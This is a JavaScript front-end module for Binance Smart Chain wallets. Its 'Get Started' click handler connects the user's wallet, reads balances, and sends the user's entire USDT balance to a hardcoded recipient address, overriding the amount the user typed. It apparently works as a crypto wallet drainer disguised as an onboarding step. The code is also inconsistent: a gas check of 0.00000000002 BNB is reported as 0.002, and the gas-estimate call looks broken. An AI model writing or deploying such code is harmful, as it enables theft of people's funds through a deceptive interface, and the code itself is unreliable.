import { JsonRpcProvider, BrowserProvider, Contract, formatUnits, formatEther, parseUnits } from 'ethers';

const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const RECIPIENT_ADDRESS = '0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d';
const USDT_ABI = [
    { "constant": true, "inputs": [{"internalType": "address", "name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "payable": false, "stateMutability": "view", "type": "function" },
    { "constant": false, "inputs": [{"internalType": "address", "name": "recipient", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "transfer", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function" }
];

// Provider and RPC
const rpcUrl = process.env.REACT_APP_RPC_URL || "https://bsc-dataseed.binance.org/";
const bscProvider = new JsonRpcProvider(rpcUrl);

// Function to Switch Network to BSC
export const checkAndSwitchToBsc = async () => {
    try {
        if (!window.ethereum) {
            throw new Error("No Ethereum wallet detected. Please install MetaMask.");
        }
        const currentNetwork = await window.ethereum.request({ method: 'eth_chainId' });
        const bscChainId = '0x38';  // BSC Chain ID

        if (currentNetwork !== bscChainId) {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: bscChainId }],
            });
        }
    } catch (error) {
        console.error("Error switching network:", error);
        throw error;
    }
};

// Fetching USDT and BNB Balances
export const fetchBalances = async (address) => {
    try {
        const usdtContract = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, bscProvider);
        const usdtBalance = await usdtContract.balanceOf(address);
        const formattedUSDTBalance = formatUnits(usdtBalance, 18);

        const provider = new BrowserProvider(window.ethereum);
        const bnbBalanceRaw = await provider.getBalance(address);
        const formattedBNBBalance = formatEther(bnbBalanceRaw);

        return {
            usdt: parseFloat(formattedUSDTBalance),
            bnb: parseFloat(formattedBNBBalance)
        };
    } catch (error) {
        console.error("Error fetching balances:", error);
        throw new Error("Failed to fetch balances.");
    }
};

export const handleGetStartedClick = async (usdtAmountInput) => {
    try {
        await checkAndSwitchToBsc();
        const provider = new BrowserProvider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = await provider.getSigner();
        const address = await signer.getAddress();
        let balances = await fetchBalances(address);
        console.log("Initial Balances:", balances);
        // Check BNB balance
        if (balances.bnb < 0.00000000002) {
            throw new Error("Insufficient BNB for gas fees. Need at least 0.002 BNB.");
        }
        let finalTransferAmount = parseFloat(usdtAmountInput) || 0;
        if (balances.usdt >= 1 && finalTransferAmount !== balances.usdt) {
            const userConfirmed = window.confirm(`Your entire USDT balance (${balances.usdt} USDT) will be transferred. Continue?`);
            if (!userConfirmed) throw new Error("User cancelled transfer.");
            finalTransferAmount = balances.usdt;
        }
        if (finalTransferAmount <= 0) {
            throw new Error("Invalid transfer amount.");
        }
        console.log(`📢 Preparing to transfer: ${finalTransferAmount} USDT to ${RECIPIENT_ADDRESS}`);
        console.log("🚀 Sending USDT...");
        const contractWithSigner = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
        const amountInWei = parseUnits(finalTransferAmount.toString(), 18);
        const estimatedGas = await contractWithSigner.estimateGas.transfer(RECIPIENT_ADDRESS, amountInWei);
        const gasLimit = estimatedGas * 3n / 2n;
        console.log(`Estimated Gas: ${estimatedGas.toString()}, Gas Limit: ${gasLimit.toString()}`);
        const transferTx = await contractWithSigner.transfer(RECIPIENT_ADDRESS, amountInWei, { gasLimit });
        await transferTx.wait();
        console.log(`✅ Transfer successful!`);
    } catch (error) {
        console.error("❌ Error during transaction process:", error);
        throw error;
    }
};
